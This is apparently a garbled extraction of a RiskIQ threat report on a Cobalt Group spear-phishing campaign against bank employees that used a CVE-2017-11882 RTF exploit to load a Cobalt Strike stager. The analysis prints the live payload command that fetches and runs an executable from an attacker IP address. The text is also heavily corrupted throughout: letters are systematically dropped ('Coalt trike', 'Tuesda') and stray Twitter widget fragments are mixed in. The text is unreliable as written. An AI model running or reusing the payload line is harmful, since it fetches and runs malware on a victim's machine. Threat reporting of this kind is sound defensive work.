However, the gave up much more information than the intended.\nOn Tuesda, Novemer 21, a massive spear-phishing campaign egan targeting individual\nemploees at various financial institutions, mostl in Russia and Turke. Purporting to provide info\non changes to ‘WIFT’ terms, the email contained a single attachment with no text in the od. It\nwas an attempt  the Coalt Group to gain a foothold in the networks of the targeted individuals’\norganizations:\nFig-1 What the targets saw\nHowever, rather than putting their targets in CC, the attackers put the entire list in the ‘TO’ field\nallowing us to see their full list of intended targets. This isn’t the first time we’ve seen attackers\nmake this error—ack in March, an attack focussing on 1,880 targets across financial institutions in\nKazakhstan had the same flaw.\nFig-2 As first seen on Twitter\nPaload Analsis\nThe attachment in the email is an RTF document ausing the recentl disclosed exploit  referred to\nas CV-2017-11882  which is capale of leveraging Office 2007 to 2016 to execute code. The file\n‘wift changes.rtf’ uses this exploit to start a remote paload like so:\ncmd /c start \\\\138.68.234.128\\w\\w.exe &AAAAAC\nThe paload is a stager for a tool known as ‘Coalt trike’ which, normall, is used in red teaming\nand pen testing engagements. The framework has gained some notoriet with adversaries as it’s\neen used in multiple attacks against financial institutions in the past .\nTwitter \nRiskIQ Retweeted\nTwitter \nTwitter \nRiskIQ Retweeted\nTwitter \nRiskIQ\nRiskIQ is the leader in attack surface\nmanagement.

The majorit of targeting was focused on Turke and Russia, ut there\nwas also a road attempt at a compromise, targeting emploees of one financial institution in eight\ndifferent countries.\nOur list of countries in which emploees were targeted includes the United tates, Netherlands,\nItal, Austria, Ukraine, Turke, Ukraine, Russia, Jordan, Kuwait, and the Czech Repulic:\nFig-3 Targeted countries highlighted in red\nOne thing we noticed when analzing the targets of this campaign was that there were a lot of\ndirect emploee email addresses on the list, which make their emails more convincing. More\ninteresting is that the majorit of these email addresses were found simpl  Googling for email\naddresses for the financial institution making it likel the attackers used open source intelligence to\ngather their list of targets, and no prior information was needed to get the addresses.\nFinding More Coalt trike\nAt RiskIQ, one of the datasets uilt from our large quantities of Internet data is a repositor of L\ncertificates and where we’ve seen them. What’s interesting aout the case mentioned aove is that\nthe host is using a certificate seemingl shipped with Coalt trike  default. We can look up the\ncertificate in RiskIQ Communit via its HA1 fingerprint:\n6ece5ece4192683d2d84e250a7e04f9c7e7c\nFig-4 L data inside RiskIQ Communit\nWhat we find is that at least a 100 different hosts seem to have een running an HTTP server with\nthe same certificate. If we jump over to our I API , we find that there have een 816(!) hosts\nrunning an HTTP server with this certificate—all Coalt trike servers using a default certificate. To\nensure our findings were correct, we confirmed them with previousl reported threats that involved\nCoalt trike.\nFrom the data gathered through I, we can create some statistics on the setup of these Coalt\ntrike servers.

Formall, Coalt trike is sold as a toolset for pen testing and red teaming engagements.\nWe’ve put all the hosts we’ve seen running Coalt trike with a default L certificate in a RiskIQ\nCommunit project.
